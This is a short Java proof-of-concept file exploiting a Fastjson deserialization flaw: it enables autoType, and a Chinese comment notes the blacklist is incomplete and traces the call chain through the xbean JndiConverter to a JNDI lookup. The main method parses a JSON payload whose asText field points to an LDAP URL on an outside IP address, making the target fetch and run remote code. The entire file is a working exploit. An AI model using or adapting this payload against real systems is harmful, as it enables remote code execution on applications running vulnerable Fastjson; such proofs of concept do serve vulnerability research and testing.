import com.alibaba.fastjson.JSON;

/**
 * Created by xjj on 2023/3/9.
 */
public class FastJson7_Eq1262 {
    static {
        System.setProperty("fastjson.parser.autoTypeSupport", "true");
    }
    // 黑名单不全
    // org.apache.xbean.propertyeditor.AbstractConverter.setAsText(String text)
    //  org.apache.xbean.propertyeditor.AbstractConverter.toObject(String text)
    //   org.apache.xbean.propertyeditor.JndiConverter.toObjectImpl(String text)
    //    context.lookup(text);
    public static void main(String[] args) {
        String poc = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"ldap://47.95.7.37:1389/Calc\"}\"";
        JSON.parseObject(poc);
    }
}
